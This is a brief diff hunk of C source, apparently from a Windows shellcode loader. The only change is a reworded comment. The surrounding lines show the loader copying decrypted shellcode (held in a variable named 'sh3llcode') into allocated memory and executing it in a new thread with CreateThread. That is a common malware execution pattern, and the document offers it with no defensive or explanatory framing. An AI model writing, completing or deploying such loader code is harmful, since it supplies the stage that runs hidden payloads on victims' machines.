@@ -21,7 +21,7 @@ int main(void) {
     // Copy decrypted shellcode to allocated memory
     RtlMoveMemory(alloc_mem, sh3llcode, data_len);
     
-    // Create a new thread to execute the shellcode
+    // Create a new thread to execute shellcode
     HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
     if (tHandle != NULL) {
         WaitForSingleObject(tHandle, INFINITE);
